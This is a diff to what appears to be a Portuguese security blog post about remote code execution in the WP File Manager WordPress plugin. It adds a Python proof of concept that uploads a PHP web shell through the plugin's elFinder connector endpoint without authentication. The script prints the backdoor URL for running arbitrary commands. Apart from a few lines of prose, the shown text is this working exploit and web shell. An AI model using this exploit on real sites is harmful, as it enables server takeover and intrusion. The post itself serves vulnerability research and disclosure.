@@ -64,7 +64,32 @@ De cara percebi que não tem um bom histórico.
 
 Já foi [reportado](https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/) uma vulnerabilidade que resulta em RCE no [elFinder](https://github.com/Studio-42/elFinder), então foquei em validar se essa RCE ainda acontece.
 
-![](/imgs/urce-wp-file-manager/PoC_python.png)
+{% highlight python %}
+#!/usr/bin/env python3
+
+import requests
+
+print('[+] tentando fazer upload da webshell')
+
+base_uri = "http://localhost:8000"
+webshell_name = "b4ckd00r.php"
+
+requests.post(
+    url=f"{base_uri}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", 
+    	
+    files = {
+    	'upload[]': (webshell_name, '<?php system($_GET["cmd"]) ?>')
+    }, 
+    	
+    data = {
+    	"cmd" : "upload", 
+    	"target" : "l1_Lw"
+    }
+)
+
+print(f'[+] teste sua backdoor: {base_uri}/wp-content/plugins/wp-file-manager/lib/files/{webshell_name}')
+
+{% endhighlight %}
 
 E tive uma surpresa, é permitido o upload de arquivos arbitrários no servidor.
 
